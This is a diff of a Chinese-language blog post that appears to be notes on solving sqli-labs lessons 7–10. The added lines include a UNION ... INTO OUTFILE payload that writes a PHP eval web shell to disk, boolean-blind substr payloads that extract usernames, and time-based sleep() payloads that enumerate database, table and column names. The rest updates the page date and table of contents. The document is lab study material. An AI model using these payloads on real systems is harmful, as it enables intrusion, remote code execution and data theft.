@@ -499,6 +499,34 @@
 <h2>less6</h2>
 
 <p>跟less5一样，就是把单引号改为双引</p>
+<h2>less7</h2>
+提示说是outfile
+
+<p>?=1’)) union select 1,2,”<?php @eval($_POST['a']);?>“ into outfile ‘D:/phpstudy_pro/WWW/sqli/Less-7/text.txt’ –+</p>
+<p>木马连接</p>
+<h3>前置知识</h3>
+参考：https://www.jianshu.com/p/7b9256de20d1
+
+<h2>less8</h2>
+
+<p>使用了一个函数，substr，下面有对他的介绍</p>
+<p><img src="1.png" class="lazyload" data-srcset="1.png" srcset="data:image/png;base64,666"></p>
+<p>觉得神奇的是，以前都是说去写个脚本什么的，没想到bp也可以这样</p>
+<p><a target="_blank" rel="noopener" href="http://sqli/Less-8/?id=1%27%20and%20substr((select%20group_concat(distinct%20concat_ws(%27%60%27,username))%20from%20security.users">http://sqli/Less-8/?id=1%27%20and%20substr((select%20group_concat(distinct%20concat_ws(%27`%27,username))%20from%20security.users</a>),<mark>1</mark>,1)=%27<mark>a</mark>%27%20–+</p>
+<p>添加$$，进行破解</p>
+<p>也了解了时间盲注 </p>
+<p>就是if（条件，1，2），如果条件为真，就执行1，否则，2</p>
+<p>判断是否存在注入，?id=1’ and sleep(5) –+,当存在注入的时候，就延迟5s，收到数据包</p>
+<p>其他的就跟那个less8一致</p>
+<h2>less9</h2>
+
+<p>时间忙注</p>
+<p><a target="_blank" rel="noopener" href="http://sqli/Less-9/?id=1%27%20and%20if(substr(database(),2,1)=%27e%27,1,sleep(5))%20--+">http://sqli/Less-9/?id=1%27%20and%20if(substr(database(),2,1)=%27e%27,1,sleep(5))%20--+</a></p>
+<p><a target="_blank" rel="noopener" href="http://sqli/Less-9/?id=1%27%20and%20if">http://sqli/Less-9/?id=1%27%20and%20if</a>(substr((select group_concat(distinct table_name) from information_schema.tables where table_schema=’security’),2,1)=%27u%27,1,sleep(5))%20–+</p>
+<p><a target="_blank" rel="noopener" href="http://sqli/Less-9/?id=1%27%20and%20if">http://sqli/Less-9/?id=1%27%20and%20if</a>(substr((select group_concat(distinct column_name) from information_schema.columns where table_name=’user’),2,1)=%27u%27,1,sleep(5))%20–+</p>
+<h2>less10</h2>
+
+<p>同less9，单引号变成双引号</p>
 <h2>补充新知识</h2>
 
 <h3>sql注入常用的函数</h3>
@@ -615,10 +643,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-25T21:46:03+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-02-27T21:32:32+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Feb 25, 2021</p>
+    <p>更新于：Feb 27, 2021</p>
   </a>
 </div>
 
@@ -754,7 +782,7 @@ PRINTIT.class.php
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">补充新知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">sql注入常用的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">sql双查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">双查询注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">outfile</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">前置知识</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">less10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">补充新知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">sql注入常用的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text">sql双查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">子查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">双查询注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text">outfile</span></a></li></ol></li></ol></li></ol>
     </div>
   </section>
 
